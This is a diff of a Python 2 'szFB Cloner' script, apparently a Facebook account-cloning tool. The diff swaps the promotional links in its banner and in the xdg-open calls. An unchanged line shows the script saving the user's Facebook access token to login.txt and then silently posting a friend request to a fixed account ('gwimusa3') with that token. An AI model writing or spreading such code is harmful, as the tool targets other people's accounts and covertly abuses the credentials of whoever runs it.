@@ -94,8 +94,8 @@ print  """
 \033[1;93m║╚═╝║╚═╝║╚╝║║═╣║ ╔╝ ╚═╣╚╝║║║║║═╣
 \033[1;93m╚═══╩═╗╔╩══╩══╩╝ ╚════╩══╩╝╚╩══╝
 \033[1;93m    ╔═╝║
-\033[1;93m    ╚══╝ 
-\033[1;93m www.facebook.com/groups/cyberzone360                                                                                                                                                                                                                            
+\033[1;93m    ╚══╝ \033[1;92m www.fb.com/groups/cyberzone360
+                                                                                                                                                                                                                             
 """
 
 jalan(" \033[1;96m•◈•───────•◈    \033[1;92mWelcome to szFB Cloner    \033[1;96m◈•───────•◈•")  
@@ -132,11 +132,11 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://youtube.com/channel/UCbuE5KCmKuCOcVekvwUkTUw')
+            os.system('xdg-open https://facebook.com/groups/cyberzone360')
 
     else:
         print "Wrong Username"
-        os.system('xdg-open https://youtube.com/channel/UCbuE5KCmKuCOcVekvwUkTUw')
+        os.system('xdg-open https://facebook.com/groups/cyberzone360')
 
 
 def login():
@@ -180,8 +180,8 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Login Successful.Please join our FB Group(Cyber Zone)...'
-				os.system('xdg-open https://facebook.com/groups/cyberzone360/')
+				print '\n\x1b[1;36;40m[✓] Login Successful.Please subscribe my Channel(TiPS&TRiCKS 360)'
+				os.system('xdg-open https://youtube.com/channel/UCbuE5KCmKuCOcVekvwUkTUw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
